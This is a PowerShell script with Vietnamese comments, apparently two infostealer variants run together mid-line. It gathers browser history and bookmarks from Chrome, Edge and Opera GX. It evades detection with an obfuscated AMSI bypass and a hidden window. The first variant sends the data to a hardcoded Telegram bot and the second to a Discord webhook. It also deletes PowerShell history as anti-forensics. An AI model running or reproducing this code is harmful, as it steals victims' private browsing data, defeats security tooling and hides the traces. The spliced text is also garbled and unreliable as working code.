<# 
=================================================================================================
Kịch bản: Thu thập lịch sử trình duyệt (Lẩn tránh Windows Security)

=================================================================================================
#>
param($h = 'y')

# --- BƯỚC 1: AMSI BYPASS (Làm rối sâu) ---
try {
    $m1 = 'System.Management.Automation.'
    $m2 = ('stiltUismA').ToCharArray(); [array]::Reverse($m2); $m2 = $m2 -join ''
    $f1 = ('deliaFtinIismA').ToCharArray(); [array]::Reverse($f1); $f1 = $f1 -join ''
    $u = [Ref].Assembly.GetType($m1 + $m2)
    $b = $u.GetField($f1, 'NonPublic,Static')
    $b.SetValue($null, $true)
} catch { }

# --- BƯỚC 2: THIẾT LẬP ĐƯỜNG DẪN & TELEGRAM ---
$k1 = "8734606734:AAEW7nl8oRmtFKZV2SdVgtUAnWtPcH7bThw"
$k2 = "8312702210"
$url = "h" + "tt" + "ps" + "://" + "ap" + "i." + "te" + "le" + "gr" + "am" + ".or" + "g/bo" + "t" + $k1 + "/sendDocument"

$out = Join-Path $env:TEMP ("sys_report_" + (Get-Random) + ".txt")
"--- REPORT | $(Get-Date) ---" | Out-File $out -Encoding UTF8

$Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'

# Gom các đường dẫn vào Dictionary (Làm rối tên key)
$P = @{
    'CH_H' = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
    'CH_B' = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
    'ED_H' = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History"
    'ED_B' = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks"
    'OP_H' = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"
    'OP_B' = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"
}

# --- BƯỚC 3: QUÉT DỮ LIỆU ---
foreach ($k in $P.Keys) {
    $path = $P[$k]
    if (Test-Path $path) {
        try {
            # Copy file để tránh bị khóa (Locked file)
            $tmp = Join-Path $env:TEMP ("tmp_" + (Get-Random))
            Copy-Item $path $tmp -Force -ErrorAction SilentlyContinue
            
            # Phân tích thô (Dùng Regex thay cho SQLite để tránh bị Defender bắt tools)
            $content = Get-Content -Path $tmp -Raw -ErrorAction SilentlyContinue
            $matches = [regex]::Matches($content, $Regex)
            
            $matches.Value | Sort-Object -Unique | Select-Object -First 20 | ForEach-Object {
                "$k | $_" | Out-File $out -Append -Encoding UTF8
            }
            Remove-Item $tmp -Force
        } catch { continue }
    }
}

# --- BƯỚC 4: GỬI VỀ TELEGRAM ---
if (Test-Path $out) {
    curl.exe -X POST $url -F "chat_id=$k2" -F "document=@$out" | Out-Null
    Remove-Item $out -Force
}

# Xóa lịch sử (Anti-Forensics)
Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
Stop-Process -Id $pid -Forceparam(
    [string]$sqlitePath = "$env:TEMP\sqlite\sqlite3.exe",
    [string]$hide = 'y' # Mặc định cho ẩn luôn để không hiện cửa sổ
)

# 1. Cơ chế ẩn cửa sổ (Stealth Mode)
if($hide -eq 'y'){
    $w=(Get-Process -PID $pid).MainWindowHandle
    $a='[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd,int nCmdShow);'
    $t=Add-Type -M $a -Name Win32ShowWindowAsync -Namespace Win32Functions -PassThru
    if($w -ne [System.IntPtr]::Zero){
        $t::ShowWindowAsync($w,0)
    }
}

# 2. Thiết lập Webhook & File tạm
$dc = "1479100377625399358/JbkoOkNwYnhMNSBvcrvdIYDI5mSFR_qW_bD_QMDgpmwmipl4TX_B3R_xucnpXWKNx_Hj"
$whuri = "https://discord.com/api/webhooks/$dc"
$outpath = "$env:TEMP\browser_history.txt"
$Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'

"Browser History Report | $(Get-Date)" | Out-File -FilePath $outpath -Encoding UTF8

# 3. Đường dẫn dữ liệu (Sửa lỗi dấu ngoặc và biến)
$Paths = @{
    'chrome_history'   = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
    'chrome_bookmarks' = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
    'edge_history'     = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History"
    'edge_bookmarks'   = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks"
    'opera_history'    = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"
    'opera_bookmarks'  = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"
}

$Browsers = @('chrome', 'edge', 'opera')
$DataTypes = @('history', 'bookmarks')

# 4. Quá trình thu thập
foreach ($Browser in $Browsers) {
    foreach ($Type in $DataTypes) {
        $Key = "${Browser}_${Type}"
        $Path = $Paths[$Key]

        if (Test-Path $Path) {
            try {
                if ($Type -eq 'history') {
                    $copyPath = "$env:TEMP\${Browser}_h"
                    Copy-Item $Path $copyPath -Force -ErrorAction SilentlyContinue
                    
                    if (Test-Path $sqlitePath) {
                        # Query sqlite3
                        $data = & $sqlitePath $copyPath "SELECT url FROM urls ORDER BY last_visit_time DESC LIMIT 15;"
                        $data | ForEach-Object { "$Browser [History] | $_" | Out-File $outpath -Append -Encoding UTF8 }
                    }
                    Remove-Item $copyPath -Force -ErrorAction SilentlyContinue
                } else {
                    $Value = Get-Content -Path $Path -Raw -ErrorAction SilentlyContinue | Select-String -AllMatches $Regex | % {($_.Matches).Value} | Sort -Unique
                    $Value | ForEach-Object { "$Browser [Bookmark] | $_" | Out-File $outpath -Append -Encoding UTF8 }
                }
            } catch { continue }
        }
    }
}

# 5. Gửi lên Discord và tự hủy file tạm
if (Test-Path $outpath) {
    curl.exe -F "file=@$outpath" $whuri | Out-Null
    Start-Sleep -Seconds 1
    Remove-Item $outpath -Force
}
